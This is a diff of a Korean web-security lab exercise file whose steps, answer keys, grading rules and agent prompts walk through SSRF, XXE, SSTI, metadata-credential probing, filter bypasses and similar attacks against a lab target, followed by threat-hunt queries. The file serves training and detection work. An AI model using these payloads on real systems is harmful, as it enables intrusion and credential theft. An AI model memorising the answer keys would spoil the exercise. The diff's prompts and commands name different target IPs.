@@ -20,10 +20,10 @@ steps:
   hint: URL 파라미터가 있는 엔드포인트에 내부 주소를 전달한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: curl을 사용하여 10.20.30.80:3000에서 SSRF 취약점을 테스트하라. URL 파라미터에 내부 주소(http://localhost:3000)를
+  answer: '🤖 프롬프트: curl을 사용하여 10.20.32.80:3000에서 SSRF 취약점을 테스트하라. URL 파라미터에 내부 주소(http://localhost:3000)를
     입력하여 서버 측 요청을 유도해줘
 
-    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/profile/image/url?url=http://localhost:3000'''
+    📎 참고 (CLI): curl -s ''http://10.20.40.81:3000/profile/image/url?url=http://localhost:3000'''
   answer_detail: SSRF는 서버가 사용자 입력의 URL로 요청을 보내는 취약점이다. 공격자는 이를 통해 내부 네트워크의 서비스(Redis,
     메타데이터 서버 등)에 접근할 수 있다. OWASP Top 10 2021에서 A10으로 새로 등재될 만큼 클라우드 환경에서 영향력이 크다.
   verify:
@@ -48,7 +48,7 @@ steps:
       - 404/안전거부 응답만 받고 SSRF 설명 없음
       - 완전히 다른 취약점(XSS 등)만 시연
   risk_level: medium
-  bastion_prompt: 'curl을 사용하여 10.20.30.80:3000에서 SSRF 취약점을 테스트하라. URL 파라미터에 내부 주소(http://localhost:3000)를
+  bastion_prompt: 'curl을 사용하여 10.20.32.80:3000에서 SSRF 취약점을 테스트하라. URL 파라미터에 내부 주소(http://localhost:3000)를
     입력하여 서버 측 요청을 유도해줘
 
 
@@ -63,7 +63,7 @@ steps:
     순회하며 응답을 확인해줘
 
     📎 참고 (CLI): for port in 22 80 3000 8080; do echo "Port $port:"; curl -s -o /dev/null
-    -w ''%{http_code}'' "http://10.20.30.80:3000/profile/image/url?url=http://127.0.0.1:$port"
+    -w ''%{http_code}'' "http://10.20.40.81:3000/profile/image/url?url=http://127.0.0.1:$port"
     2>/dev/null; echo ''''; done'
   answer_detail: SSRF를 통한 내부 포트 스캔은 방화벽 뒤의 서비스를 탐색하는 강력한 기법이다. 응답 코드, 응답 시간, 에러 메시지의
     차이로 포트 상태를 추정한다. Blind SSRF의 경우 외부 서버(Burp Collaborator 등)로 콜백을 유도하여 확인한다.
@@ -88,7 +88,7 @@ steps:
       - 응답 코드 비교 없이 단순 실행 로그만
   target_vm: attacker
   script: for port in 22 80 3000 8080; do echo "Port $port:"; curl -s -o /dev/null
-    -w '%{http_code}' "http://10.20.30.80:3000/profile/image/url?url=http://127.0.0.1:$port"
+    -w '%{http_code}' "http://10.20.40.81:3000/profile/image/url?url=http://127.0.0.1:$port"
     2>/dev/null; echo ''; done
   risk_level: medium
   bastion_prompt: 'SSRF를 활용하여 내부 서비스 포트를 스캔하라. curl로 127.0.0.1의 포트 22, 80, 3000, 8080을
@@ -103,7 +103,7 @@ steps:
   points: 10
   answer: '🤖 프롬프트: SSRF로 file:// 프로토콜을 사용하여 서버의 /etc/passwd 파일 읽기를 시도해줘
 
-    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/profile/image/url?url=file:///etc/passwd'''
+    📎 참고 (CLI): curl -s ''http://10.20.40.81:3000/profile/image/url?url=file:///etc/passwd'''
   answer_detail: SSRF에서 file:// 프로토콜 핸들러를 허용하면 서버 로컬 파일을 읽을 수 있다. /etc/passwd로 사용자
     목록을, /etc/shadow(권한 필요)로 해시를, /proc/self/environ으로 환경변수(DB 비밀번호 등)를 획득할 수 있다.
     방어를 위해 URL 스킴을 http/https로 제한해야 한다.
@@ -182,7 +182,7 @@ steps:
   points: 10
   answer: "\U0001F916 프롬프트: 작성한 XXE 페이로드를 curl로 XML을 처리하는 엔드포인트에 전송하라. Content-Type을\
     \ application/xml로 설정해줘\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X POST \\\n  \
-    \   -H 'Content-Type: application/xml' \\\n     -d @/tmp/xxe_payload.xml http://10.20.30.80:3000/api/Products"
+    \   -H 'Content-Type: application/xml' \\\n     -d @/tmp/xxe_payload.xml http://10.20.40.81:3000/api/Products"
   answer_detail: XXE 페이로드를 XML을 처리하는 엔드포인트에 전송하면, XML 파서가 엔티티를 확장하면서 파일 내용이 응답에 포함된다.
     JSON API라도 Content-Type을 application/xml로 변경하면 XML 파서가 동작하는 경우가 있다. 이를 Content-Type
     전환 공격이라 한다.
@@ -208,7 +208,7 @@ steps:
       - 에러 메시지만 받고 XXE 개념 해석 없음
   target_vm: attacker
   script: "curl -s \\\n     -X POST \\\n     -H 'Content-Type: application/xml' \\\
-    \n     -d @/tmp/xxe_payload.xml http://10.20.30.80:3000/api/Products"
+    \n     -d @/tmp/xxe_payload.xml http://10.20.40.81:3000/api/Products"
   risk_level: medium
   bastion_prompt: '작성한 XXE 페이로드를 curl로 XML을 처리하는 엔드포인트에 전송하라. Content-Type을 application/xml로
     설정해줘
@@ -293,7 +293,7 @@ steps:
     && echo ''2. Hex: http://0x7f000001:3000/'' && echo ''3. Octal: http://0177.0.0.1:3000/''
     && echo ''4. IPv6: http://[::1]:3000/'' && echo ''5. Short: http://127.1:3000/''
     && echo ''6. DNS rebinding: attacker.com -> 127.0.0.1'' && curl -s -o /dev/null
-    -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://2130706433:3000/'''
+    -w ''%{http_code}'' ''http://10.20.40.81:3000/profile/image/url?url=http://2130706433:3000/'''
   answer_detail: SSRF 방어에서 127.0.0.1이나 내부 IP를 차단하는 블랙리스트 방식은 다양한 IP 표현으로 우회된다. 10진수(2130706433),
     16진수(0x7f000001), 8진수(0177), 축약형(127.1), IPv6 매핑(::ffff:127.0.0.1), DNS 리바인딩 등이
     있다. 안전한 방어는 화이트리스트 방식이다.
@@ -323,7 +323,7 @@ steps:
     && echo ''2. Hex: http://0x7f000001:3000/'' && echo ''3. Octal: http://0177.0.0.1:3000/''
     && echo ''4. IPv6: http://[::1]:3000/'' && echo ''5. Short: http://127.1:3000/''
     && echo ''6. DNS rebinding: attacker.com -> 127.0.0.1'' && curl -s -o /dev/null
-    -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://2130706433:3000/'''
+    -w ''%{http_code}'' ''http://10.20.40.81:3000/profile/image/url?url=http://2130706433:3000/'''
   risk_level: medium
   bastion_prompt: 'SSRF에서 IP 주소 필터 우회를 시도하라. 127.0.0.1을 다양한 형태(10진수, 16진수, IPv6 매핑)로
     변환하여 차단을 우회해줘
@@ -342,7 +342,7 @@ steps:
     📎 참고 (CLI): echo ''=== Cloud Metadata SSRF ==='' && echo ''AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/''
     && echo ''GCP: http://metadata.google.internal/computeMetadata/v1/'' && echo ''Azure:
     http://169.254.169.254/metadata/instance?api-version=2021-02-01'' && curl -s -o
-    /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
+    /dev/null -w ''%{http_code}'' ''http://10.20.40.81:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
   answer_detail: 클라우드 환경에서 SSRF의 가장 치명적인 활용은 메타데이터 서비스 접근이다. AWS의 169.254.169.254에서
     IAM 역할의 임시 자격증명(Access Key, Secret Key, Token)을 획득하면 전체 AWS 계정을 장악할 수 있다. Capital
     One 해킹(2019)이 대표적 사례이다.
@@ -371,7 +371,7 @@ steps:
   script: 'echo ''=== Cloud Metadata SSRF ==='' && echo ''AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/''
     && echo ''GCP: http://metadata.google.internal/computeMetadata/v1/'' && echo ''Azure:
     http://169.254.169.254/metadata/instance?api-version=2021-02-01'' && curl -s -o
-    /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
+    /dev/null -w ''%{http_code}'' ''http://10.20.40.81:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
   risk_level: medium
   bastion_prompt: 'SSRF를 통한 클라우드 메타데이터 접근을 시뮬레이션하라. AWS EC2 메타데이터 엔드포인트(169.254.169.254)에
     접근하는 요청을 구성해줘
@@ -434,11 +434,11 @@ steps:
   hint: '{{7*7}}이 49로 평가되면 SSTI 취약점이 존재한다'
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: SSTI(Server-Side Template Injection) 취약점을 테스트하라. curl로 10.20.30.80:3000에
+  answer: '🤖 프롬프트: SSTI(Server-Side Template Injection) 취약점을 테스트하라. curl로 10.20.32.80:3000에
     템플릿 표현식({{7*7}})을 다양한 파라미터에 삽입해줘
 
-    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=%7B%7B7*7%7D%7D''
-    && echo '''' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=${7*7}''
+    📎 참고 (CLI): curl -s ''http://10.20.40.81:3000/rest/products/search?q=%7B%7B7*7%7D%7D''
+    && echo '''' && curl -s ''http://10.20.40.81:3000/rest/products/search?q=${7*7}''
     && echo '''' && echo ''SSTI test: if 49 appears in response, template injection
     exists'''
   answer_detail: 'SSTI는 사용자 입력이 서버 측 템플릿 엔진(Jinja2, Twig, Freemarker 등)에 직접 삽입되는 취약점이다.
@@ -465,12 +465,12 @@ steps:
       - 단일 엔진만 시도
       - 49 확인·SSTI 판정 원리 언급 없음
   target_vm: attacker
-  script: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=%7B%7B7*7%7D%7D''
-    && echo '''' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=${7*7}''
+  script: 'curl -s ''http://10.20.40.81:3000/rest/products/search?q=%7B%7B7*7%7D%7D''
+    && echo '''' && curl -s ''http://10.20.40.81:3000/rest/products/search?q=${7*7}''
     && echo '''' && echo ''SSTI test: if 49 appears in response, template injection
     exists'''
   risk_level: medium
-  bastion_prompt: 'SSTI(Server-Side Template Injection) 취약점을 테스트하라. curl로 10.20.30.80:3000에
+  bastion_prompt: 'SSTI(Server-Side Template Injection) 취약점을 테스트하라. curl로 10.20.32.80:3000에
     템플릿 표현식({{7*7}})을 다양한 파라미터에 삽입해줘
 
 
@@ -484,7 +484,7 @@ steps:
   answer: '🤖 프롬프트: HTTP Request Smuggling 취약점을 이해하기 위해 CL 구현 방법과 예시를 설명해줘
 
     📎 참고 (CLI): echo ''=== HTTP Request Smuggling (CL.TE) ==='' && echo ''POST / HTTP/1.1''
-    && echo ''Host: 10.20.30.80'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
+    && echo ''Host: 10.20.32.80'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
     chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo
     '''' && echo ''Front-end uses Content-Length, Back-end uses Transfer-Encoding''
     && echo ''Result: SMUGGLED becomes start of next request'''
@@ -514,7 +514,7 @@ steps:
       - raw 요청 구조 없이 curl 한 줄만
   target_vm: attacker
   script: 'echo ''=== HTTP Request Smuggling (CL.TE) ==='' && echo ''POST / HTTP/1.1''
-    && echo ''Host: 10.20.30.80'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
+    && echo ''Host: 10.20.32.80'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
     chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo
     '''' && echo ''Front-end uses Content-Length, Back-end uses Transfer-Encoding''
     && echo ''Result: SMUGGLED becomes start of next request'''
@@ -590,7 +590,7 @@ steps:
   answer: "\U0001F916 프롬프트: 웹소켓(WebSocket) 기반 취약점을 테스트해줘\n\U0001F4CE 참고 (CLI): curl\
     \ -s -i -N \\\n  -H 'Connection: Upgrade' \\\n  -H 'Upgrade: websocket' \\\n \
     \ -H 'Sec-WebSocket-Version: 13' \\\n  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=='\
-    \ http://10.20.30.80:3000/socket.io/ 2>&1 \\\n | head -20"
+    \ http://10.20.40.81:3000/socket.io/ 2>&1 \\\n | head -20"
   answer_detail: WebSocket은 HTTP 업그레이드를 통해 양방향 통신을 수립한다. WebSocket 연결은 일반적으로 CORS,
     CSRF 토큰 검증이 적용되지 않아 Cross-Site WebSocket Hijacking(CSWSH) 공격에 취약할 수 있다. 또한 WebSocket
     메시지에 대한 입력 검증이 누락되면 인젝션 공격이 가능하다.
@@ -618,7 +618,7 @@ steps:
   target_vm: attacker
   script: "curl -s -i -N \\\n  -H 'Connection: Upgrade' \\\n  -H 'Upgrade: websocket'\
     \ \\\n  -H 'Sec-WebSocket-Version: 13' \\\n  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=='\
-    \ http://10.20.30.80:3000/socket.io/ 2>&1 \\\n | head -20"
+    \ http://10.20.40.81:3000/socket.io/ 2>&1 \\\n | head -20"
   risk_level: medium
   bastion_prompt: '웹소켓(WebSocket) 기반 취약점을 테스트해줘
 
@@ -632,8 +632,8 @@ steps:
   category: exploit
   points: 10
   answer: "\U0001F916 프롬프트: CORS(Cross-Origin Resource Sharing) 설정 오류를 테스트하라. curl로\
-    \ Origin 헤더를 변조하여 10.20.30.80:3000의 CORS 정책을 확인해줘\n\U0001F4CE 참고 (CLI): curl -s\
-    \ -I \\\n  -H 'Origin: https://evil.com' http://10.20.30.80:3000/rest/products/search?q=test\
+    \ Origin 헤더를 변조하여 10.20.32.80:3000의 CORS 정책을 확인해줘\n\U0001F4CE 참고 (CLI): curl -s\
+    \ -I \\\n  -H 'Origin: https://evil.com' http://10.20.40.81:3000/rest/products/search?q=test\
     \ \\\n | grep -i 'access-control'"
   answer_detail: 'CORS 설정 오류는 Access-Control-Allow-Origin이 요청의 Origin을 그대로 반사(reflect)하거나,
     와일드카드(*)와 함께 credentials: true를 허용하는 경우 발생한다. 공격자는 악성 사이트에서 피해자의 브라우저를 통해 대상 API에
@@ -659,11 +659,11 @@ steps:
       - 응답 헤더 확인 없음
       - 반사형 Origin + credentials 위험성 설명 없음
   target_vm: attacker
-  script: "curl -s -I \\\n  -H 'Origin: https://evil.com' http://10.20.30.80:3000/rest/products/search?q=test\
+  script: "curl -s -I \\\n  -H 'Origin: https://evil.com' http://10.20.40.81:3000/rest/products/search?q=test\
     \ \\\n | grep -i 'access-control'"
   risk_level: medium
   bastion_prompt: 'CORS(Cross-Origin Resource Sharing) 설정 오류를 테스트하라. curl로 Origin
-    헤더를 변조하여 10.20.30.80:3000의 CORS 정책을 확인해줘
+    헤더를 변조하여 10.20.32.80:3000의 CORS 정책을 확인해줘
 
 
     [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
@@ -744,7 +744,7 @@ steps:
     ■ 산출물 — 7 공격 재현 + KQL/SPL Threat Hunt query 7종
 
     ▶ Hunt 1 — SSRF localhost (T1190)
-    재현: `curl -s "http://10.20.30.80:3000/redirect?to=http://127.0.0.1:22" -o /dev/null -w "%{http_code}\n"`
+    재현: `curl -s "http://10.20.40.81:3000/redirect?to=http://127.0.0.1:22" -o /dev/null -w "%{http_code}\n"`
     KQL (MS Sentinel):
     `cat <<'EOF'
     // KQL: SSRF localhost or 127.x.x.x in URL parameter
@@ -768,7 +768,7 @@ steps:
     EOF`
 
     ▶ Hunt 2 — SSRF cloud metadata (T1552.005)
-    재현: `curl -s "http://10.20.30.80:3000/redirect?to=http://169.254.169.254/latest/meta-data/" -o /dev/null -w "%{http_code}\n"`
+    재현: `curl -s "http://10.20.40.81:3000/redirect?to=http://169.254.169.254/latest/meta-data/" -o /dev/null -w "%{http_code}\n"`
     KQL:
     `cat <<'EOF'
     AppRequests
@@ -782,7 +782,7 @@ steps:
     재현: `cat <<'EOF' > /tmp/xxe_test.xml
     <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
     EOF
-    curl -s -X POST -H "Content-Type: application/xml" -d @/tmp/xxe_test.xml http://10.20.30.80:3000/api/feedback 2>&1 | head -5`
+    curl -s -X POST -H "Content-Type: application/xml" -d @/tmp/xxe_test.xml http://10.20.40.81:3000/api/feedback 2>&1 | head -5`
     KQL:
     `cat <<'EOF'
     AppRequests
@@ -793,7 +793,7 @@ steps:
     EOF`
 
     ▶ Hunt 4 — SSTI {{7*7}} (T1059)
-    재현: `curl -s "http://10.20.30.80:3000/?q={{7*7}}" -o /dev/null -w "%{http_code}\n"`
+    재현: `curl -s "http://10.20.40.81:3000/?q={{7*7}}" -o /dev/null -w "%{http_code}\n"`
     SPL:
     `cat <<'EOF'
     index=web sourcetype=apache_access
@@ -803,7 +803,7 @@ steps:
     EOF`
 
     ▶ Hunt 5 — Deserialization (T1059) — JSON __proto__ / node-serialize
-    재현: `curl -s -X POST -H "Content-Type: application/json" -d '{"__proto__":{"role":"admin"}}' http://10.20.30.80:3000/api/Users/ -o /dev/null -w "%{http_code}\n"`
+    재현: `curl -s -X POST -H "Content-Type: application/json" -d '{"__proto__":{"role":"admin"}}' http://10.20.40.81:3000/api/Users/ -o /dev/null -w "%{http_code}\n"`
     KQL:
     `cat <<'EOF'
     AppRequests
@@ -814,7 +814,7 @@ steps:
 
     ▶ Hunt 6 — Race Condition / TOCTOU (T1212)
     재현: 동일 endpoint 에 동시 5 요청 (login race):
-    `for i in 1 2 3 4 5; do curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login -o /dev/null -w "$(date +%s%N) %{http_code}\n" & done; wait`
+    `for i in 1 2 3 4 5; do curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.40.81:3000/rest/user/login -o /dev/null -w "$(date +%s%N) %{http_code}\n" & done; wait`
     SPL:
     `cat <<'EOF'
     index=web sourcetype=apache_access
@@ -824,7 +824,7 @@ steps:
     EOF`
 
     ▶ Hunt 7 — WAF 우회 (이중 인코딩 / case mix, T1027)
-    재현: `curl -s -G "http://10.20.30.80:3000/rest/products/search" --data-urlencode "q=' Or 1=1--" -o /dev/null -w "%{http_code}\n"`
+    재현: `curl -s -G "http://10.20.40.81:3000/rest/products/search" --data-urlencode "q=' Or 1=1--" -o /dev/null -w "%{http_code}\n"`
     KQL:
     `cat <<'EOF'
     AppRequests
@@ -851,35 +851,35 @@ steps:
     7 공격 재현 + KQL/SPL hunt query 7종.
 
     Hunt 1 SSRF localhost:
-    `curl -s "http://10.20.30.80:3000/redirect?to=http://127.0.0.1:22" -o /dev/null -w "%{http_code}\n"`
+    `curl -s "http://10.20.40.81:3000/redirect?to=http://127.0.0.1:22" -o /dev/null -w "%{http_code}\n"`
     KQL (heredoc): localhost/127.0.0.1/[::1] 매칭 + ResultDescription !contains "/health".
     SPL: rex target = 127.0.0.1/localhost.
 
     Hunt 2 Cloud metadata:
-    `curl -s "http://10.20.30.80:3000/redirect?to=http://169.254.169.254/latest/meta-data/" -o /dev/null -w "%{http_code}\n"`
+    `curl -s "http://10.20.40.81:3000/redirect?to=http://169.254.169.254/latest/meta-data/" -o /dev/null -w "%{http_code}\n"`
     KQL: 169.254.169.254 / metadata.google.internal / 100.100.100.200.
 
     Hunt 3 XXE:
     `cat <<'EOF' > /tmp/xxe_test.xml
     <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
     EOF
-    curl -s -X POST -H "Content-Type: application/xml" -d @/tmp/xxe_test.xml http://10.20.30.80:3000/api/feedback 2>&1 | head -5`
+    curl -s -X POST -H "Content-Type: application/xml" -d @/tmp/xxe_test.xml http://10.20.40.81:3000/api/feedback 2>&1 | head -5`
     KQL: ContentType has "xml" + RequestBody has "<!ENTITY".
 
     Hunt 4 SSTI:
-    `curl -s "http://10.20.30.80:3000/?q={{7*7}}" -o /dev/null -w "%{http_code}\n"`
+    `curl -s "http://10.20.40.81:3000/?q={{7*7}}" -o /dev/null -w "%{http_code}\n"`
     SPL: input="*{{*}}*" OR input="*${*}*".
 
     Hunt 5 Deserialize:
-    `curl -s -X POST -H "Content-Type: application/json" -d '{"__proto__":{"role":"admin"}}' http://10.20.30.80:3000/api/Users/ -o /dev/null -w "%{http_code}\n"`
+    `curl -s -X POST -H "Content-Type: application/json" -d '{"__proto__":{"role":"admin"}}' http://10.20.40.81:3000/api/Users/ -o /dev/null -w "%{http_code}\n"`
     KQL: __proto__ / constructor.prototype / _$$ND_FUNC$$_.
 
     Hunt 6 Race:
-    `for i in 1 2 3 4 5; do curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login -o /dev/null -w "$(date +%s%N) %{http_code}\n" & done; wait`
+    `for i in 1 2 3 4 5; do curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.40.81:3000/rest/user/login -o /dev/null -w "$(date +%s%N) %{http_code}\n" & done; wait`
     SPL: bin _time span=1s | count > 3 by clientip, uri.
 
     Hunt 7 WAF:
-    `curl -s -G "http://10.20.30.80:3000/rest/products/search" --data-urlencode "q=' Or 1=1--" -o /dev/null -w "%{http_code}\n"`
+    `curl -s -G "http://10.20.40.81:3000/rest/products/search" --data-urlencode "q=' Or 1=1--" -o /dev/null -w "%{http_code}\n"`
     KQL: Url matches regex (%25){2,} or union select case-insensitive.
 
     각 query heredoc 출력. 마지막에 7행 요약표 (Hunt / T-ID / Platform / FP / Action).
